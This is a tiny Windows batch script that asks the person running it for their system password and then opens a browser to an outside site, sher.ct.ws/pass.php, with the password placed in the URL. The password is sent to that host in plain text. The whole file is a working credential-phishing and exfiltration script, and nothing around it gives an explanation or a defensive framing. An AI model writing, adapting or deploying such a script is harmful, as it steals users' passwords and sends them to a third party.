@echo off
setlocal enabledelayedexpansion
set /p pass=Please Enter Your System Password: 
start https://sher.ct.ws/pass.php?text=%pass%
endlocal
exit
